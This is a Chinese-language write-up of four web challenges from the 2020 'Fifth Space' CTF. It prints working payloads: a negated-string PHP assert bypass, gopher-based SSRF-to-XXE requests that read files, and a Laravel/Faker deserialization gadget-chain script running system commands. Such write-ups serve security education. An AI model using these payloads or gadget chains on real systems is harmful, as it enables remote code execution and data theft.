# 2020 “第五空间” 智能安全大赛 Web Writeup

阅读量 **241055**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-06-30 10:30:35

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t014b0060f71709846a.jpg)

## 0x01 hate-php

这道Web题比较简单，访问后直接返回源代码进行审计

    
    
     <?php
    error_reporting(0);
    if(!isset($_GET['code'])){
        highlight_file(__FILE__);
    }else{
        $code = $_GET['code'];
        if (preg_match('/(f|l|a|g|.|p|h|/|;|"|'|`|||[|]|_|=)/i',$code)) { 
            die('You are too good for me'); 
        }
        $blacklist = get_defined_functions()['internal'];
        foreach ($blacklist as $blackitem) { 
            if (preg_match ('/' . $blackitem . '/im', $code)) { 
                die('You deserve better'); 
            } 
        }
        assert($code);
    }
    

这里主要是利用最后的assert去RCE，只要绕过黑名单限制的字符就可以，可以用字符串取反操作轻松绕过：

    
    
    (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)
    

![](https://p5.ssl.qhimg.com/t018ace8b0c6393f86c.jpg)

## 0x02 do you know

这道Web虽然步骤稍微多一些，但是给的提示比较多，一步一步来总体感觉是水到渠成  
首先访问index.php后返回逻辑代码

    
    
    <?php
    highlight_file(__FILE__);
    #本题无法访问外网
    #这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了
    #各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好
    #there is xxe.php
    $poc=$_SERVER['QUERY_STRING'];
    if(preg_match("/log|flag|hist|dict|etc|file|write/i" ,$poc)){
                    die("no hacker");
            }
    $ids=explode('&',$poc);
    $a_key=explode('=',$ids[0])[0];
    $b_key=explode('=',$ids[1])[0];
    $a_value=explode('=',$ids[0])[1];
    $b_value=explode('=',$ids[1])[1];
    
    if(!$a_key||!$b_key||!$a_value||!$b_value)
    {
            die('我什么都没有~');
    }
    if($a_key==$b_key)
    {
        die("trick");
    }
    
    if($a_value!==$b_value)
    {
            if(count($_GET)!=1)
            {
                    die('be it so');
            }
    }
    foreach($_GET as $key=>$value)
    {
            $url=$value;
    }
    
    $ch = curl_init();
        if ($type != 'file') {
            #add_debug_log($param, 'post_data');
            // 设置超时
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        } else {
            // 设置超时
            curl_setopt($ch, CURLOPT_TIMEOUT, 180);
        }
    
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
        // 设置header
        if ($type == 'file') {
            $header[] = "content-type: multipart/form-data; charset=UTF-8";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        } elseif ($type == 'xml') {
            curl_setopt($ch, CURLOPT_HEADER, false);
        } elseif ($has_json) {
            $header[] = "content-type: application/json; charset=UTF-8";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
    
        // curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
        // dump($param);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
        // 要求结果为字符串且输出到屏幕上
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // 使用证书：cert 与 key 分别属于两个.pem文件
    
    
        $res = curl_exec($ch);
        var_dump($res);
    

这里提示还给了xxe.php，访问后同样给了源代码，又提示了main.php和hints.php。这里掺杂了一些html内容，就不贴了

    
    
    <?php
    highlight_file(__FILE__);
    #这题在上午的时候为了防止有人用webshell扫描器d，有一段时间临时过滤了system关键字，但是这个关键字在解题中是用不到的，所以才过滤它，给选手造成的不便请您谅解
    #这题和命令执行无关，请勿尝试
    #there is main.php and hints.php
    if($_SERVER["REMOTE_ADDR"] !== "127.0.0.1"){
    die('show me your identify');
    }
    libxml_disable_entity_loader(false);
    $data = isset($_POST['data'])?trim($_POST['data']):'';
    $data = preg_replace("/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i",'',$data);
    $resp = '';
    if($data != false){
        $dom = new DOMDocument();
        $dom->loadXML($data, LIBXML_NOENT);
        ob_start();
        var_dump($dom);
        $resp = ob_get_contents();
        ob_end_clean();
    
    }
    ?> 
    <?php
    echo ($data!=false)?htmlspecialchars($data):htmlspecialchars('');
    ?>
    <?php echo htmlspecialchars($resp);?>
    

到这一步为止，是比较明显的，利用curl去构造SSRF访问xxe.php，并且利用XXE去读取下一步的内容。其实这里构造的过程有一些坑，主要还是在传参时候的URL编码问题，构造时一定要仔细！  
具体来说，利用gopher协议构造和发起POST的HTTP请求，将data参数传入xxe.php，data是常见的文件读取payload

另外，这里的过滤条件可以用复写来绕过，例如fireadle经过处理后还原成了file，最后构造文件读取

    
    
    gopher://127.0.0.1:80/_POST /xxe.php HTTP/1.1%250d%250aHost:127.0.0.1:80%250d%250aContent-Type:application/x-www-form-urlencoded%250d%250aContent-Length:149%250d%250a%250d%250adata=<%253fxml%2bversion%2b%253d%2b"1.0"%253f><!DOCTYPE%2bANY%2b[%2b%2b%2b%2b<!ENTITY%2bf%2bSYSdtdTEM%2b"php://filter/rereadad=convert.base64-encode/resource=hints.php">]><x>%252526f;</x>
    

读取hints.php和main.php的内容后，如下：

    
    
    //hints.php
    <?php
    #there is an main.php
    #“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”
    #“那你给我算一个出来”
    #“好的”
    #
    #小白打开了win10的calc，开始计算8129947191207+1992100742919
    #然后他直接用鼠标复制了结果，计算md5值
    #“好了大佬，10122047934126的md5值”
    #“6dc6a29df1d7d33166bba5e17e42d2ea对吧”
    #“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”
    #
    #“咱们对一下数字？”
    #‭10122047934126‬
    #10122047934126
    #“这不是一样的吗....咋就md5不一样了.......”
    #
    #找出来到底哪里出了问题，就可以看这道web题目了
    
    
    
    //main.php
    <?php
    class A
    {
        public $object;
        public $method;
        public $variable;
    
        function __destruct()
        {
            $o = $this->object;
            $m = $this->method;
            $v = $this->variable;
            $o->$m();
            global $$v;
            $answer = file_get_contents('flag.php');
            ob_end_clean();
        }
    }
    
    class B
    {
        function read()
        {
            ob_start();
            global $answer;
            echo $answer;
        }
    }
    if($_SERVER["REMOTE_ADDR"] !== "127.0.0.1"){
    die('show me your identify');
    }
    if (isset($_GET['‬'])) {
        unserialize($_GET['‬'])->CaptureTheFlag();
    } else {
        die('you do not pass the misc');
    }
    

根据这里hints.php的内容提示，win10的计算器鼠标直接复制后，会在数字的前后加上两个不可见的unicode字符%e2%80%ad和%e2%80%ac，在这里的`unserialize($_GET['‬'])`部分，测试后发现可以用`%e2%80%ac=123`传参内容。  
到这一步按照预期应该是利用两个类的反序列化操作去想办法读取flag.txt内容了，但是其实回过头看看，xxe.php已经能够任意文件读取了不是吗？这里main.php的意义更像是告诉我们flag就是在flag.php中，因此直接构造payload用XXE读取flag……利用前面复写的方式能够绕过flag的黑名单限制！

    
    
    gopher://127.0.0.1:80/_POST /xxe.php HTTP/1.1%250d%250aHost:127.0.0.1:80%250d%250aContent-Type:application/x-www-form-urlencoded%250d%250aContent-Length:149%250d%250a%250d%250adata=<%253fxml%2bversion%2b%253d%2b"1.0"%253f><!DOCTYPE%2bANY%2b[%2b%2b%2b%2b<!ENTITY%2bf%2bSYSdtdTEM%2b"php://filter/rereadad=convert.base64-encode/resource=flxxeag.php">]><x>%252526f;</x>
    

得到flag内容

    
    
    <?php
    $flag='flag{5bc0bc291d322450679866d5ddf0a346}';
    

## 0x03 美团外卖

这题相对其他CTF题目比较清新脱俗，拿了个简单的CMS模拟渗透测试的过程和代码审计，比较有趣。访问页面后返回了一个登录窗口，扫描敏感文件后发现有文件泄露`www.zip`，于是直接开始审计代码。  
经过审计之后（文件并不多，不太耗时），发现daochu.php文件中的功能可能存在问题，对传参的SQL拼接内容没有做好校验，存在SQL注入的问题，为了节省时间直接拿sqlmap一把梭。

![](https://p4.ssl.qhimg.com/t01ab54d06ddbb4fd92.jpg)

拿到管理员的账密和一条提示，比较难受的是这个账密并不能登录成功，看了下源码，有校验需要id>0。接着直接访问hints中的目录路径，发现是一个一毛一样的页面，经过测试发现同样不能登录，但是差异在于源码中的`lib`目录在刚刚的`/`下访问是404，但是在hints的路径下，是存在的。  
于是继续审计lib下的内容，主要是一些插件，比较瞩目的是其中的webuploader 0.1.5和ueditor，测试后发现webuploader
0.1.5存在漏洞，漏洞详情可以参考：<https://github.com/jas502n/webuploader-0.1.15-Demo>  
利用该漏洞后相应中返回了一段新的提示：

![](https://p0.ssl.qhimg.com/t012ae83088df5c3f9e.jpg)

访问同级目录下的文件后，直接利用该后门…

    
    
    http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php
    
    http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag
    

![](https://p4.ssl.qhimg.com/t010ac0f1967a06245d.jpg)

## 0x04 laravel

这道题稍微比较硬核，但是如果对laravel找pop链比较熟悉应该也不算很难。题目给了部署网站的源码，是基于Laravel
5.7的框架。题目只有一个路由，即一个反序列化点：

    
    
    <?php
    namespace AppHttpControllers;
    class TaskController
    {
     public function index(){
         if(isset($_GET['p'])){
             unserialize($_GET['p']);
         }
     return "There is an param names p (get)";
     }
    }
    ?>
    

下面的事就是去找pop链了，一开始果断祭出（白嫖方法）最强法宝——其他人对laravel5.7和5.8的pop链，不过逐一试过去发现没有一个能用的…  
这基本可以确定出题人应该是做了手脚了，去查看了下几个pop链常用的入口点PendingBroadcast、PendingCommand，果然触发点被出题人干掉了…

    
    
        //PendingBroadcast
        /**
         * Handle the object's destruction.
         *
         * @return void
         */
        public function __destruct()
        {
            return "no here!";
        }
    
        //PendingCommand
        /**
         * Handle the object's destruction.
         *
         * @return void
         */
        public function __destruct()
        {
            if ($this->hasExecuted) {
                return;
            }
    
        }
    }
    

缓过神来之后，默默拿出PhpStorm开始自个儿再慢慢找了…  
从析构函数开始逐个排查，经过漫长的寻觅后终于确定到一个能用的入口点

    
    
    SymfonyComponentRoutingLoaderConfiguratorImportConfigurator
    

这个类的析构函数中的函数调用形式就很美好，而且$this->parent和$this->route可控，只要再找到一个函数执行点，理想状态是在__call()魔术方法中

    
    
    public function __destruct()
        {
            $this->parent->addCollection($this->route);
        }
    

继续按照
**call()魔术方法寻觅，找到了`FakerGenerator`，这个类的**call()函数中调用format，而format中就有我们需要的call_user_func_array！

    
    
    public function format($formatter, $arguments = array())
        {
            return call_user_func_array($this->getFormatter($formatter), $arguments);
        }
    public function __call($method, $attributes)
        {
            return $this->format($method, $attributes);
        }
    

直接写EXP：

    
    
    <?php
    namespace SymfonyComponentRoutingLoaderConfigurator{
        class ImportConfigurator{
            private $parent;
    
            public function __construct($parent, $route)
            {
                $this->parent = $parent;
                $this->route = $route;
            }
        }
    }
    
    namespace Faker{
        class Generator{
            protected $providers = array();
            protected $formatters = array();
    
            public function __construct($formatters)
            {
                $this->formatters = $formatters;
            }
        }
    }
    
    namespace{
        $a = new FakerGenerator(array('addCollection'=>'system'));
        $b = new SymfonyComponentRoutingLoaderConfiguratorImportConfigurator($a, 'cat /flag');
        echo urlencode(serialize($b));
    }
    ?>
    

最后拿到flag内容：

![](https://p1.ssl.qhimg.com/t0137d425a8a6fa4443.jpg)

## 0x05 总结

Web题总体不难，还有一道zzm’s blog没有做出来，总之还是挺有收获的，感谢阅读~

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **yunsle** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/209205](/post/id/209205)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t018d078a0ca4861591.jpg) yunsle

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

